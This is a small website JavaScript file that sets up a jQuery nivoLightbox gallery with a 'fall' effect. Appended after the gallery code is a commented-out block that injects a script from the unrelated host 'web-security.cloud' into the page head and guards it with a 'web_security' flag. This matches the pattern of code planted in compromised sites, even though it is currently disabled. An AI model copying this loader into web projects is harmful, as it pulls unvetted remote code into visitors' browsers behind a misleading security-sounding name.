
$(function() {
	'use strict';

/*--------------------------------------------------------------
    Gallery Lightbox pluging
--------------------------------------------------------------*/
    $('.gallery-2 .thumbnail a').nivoLightbox({
         effect: 'fall'
    });

}); // end of document.ready
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/